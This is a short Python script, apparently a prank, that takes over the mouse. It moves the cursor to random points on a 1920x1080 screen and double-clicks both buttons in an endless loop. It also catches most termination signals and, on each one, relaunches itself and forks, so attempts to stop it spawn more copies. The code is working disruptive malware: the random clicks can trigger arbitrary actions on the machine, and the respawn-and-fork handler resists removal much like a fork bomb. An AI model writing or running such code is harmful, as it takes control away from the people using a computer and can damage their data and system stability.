import time
import random
from pynput.mouse import Button, Controller
import signal
import subprocess
import os

'''
Im an asshole
'''
def sigint_sigterm(signo, frame):
    subprocess.call(["python", __file__], shell=True)
    os.fork()
    print("oops")

'''
Signal Catching for fun and profit
'''
for i in range(1, 16):
    if i == 9:
        continue
    else:
        signal.signal(i, sigint_sigterm)

_scr_dimensions = (1920, 1080)

mouse = Controller()
while True:
    random.seed()
    mouse.position = (random.randint(0, _scr_dimensions[0]-1),random.randint(0, _scr_dimensions[1]-1))
    mouse.click(Button.left, 2)
    mouse.click(Button.right, 2)
    time.sleep(random.randint(0, 5))

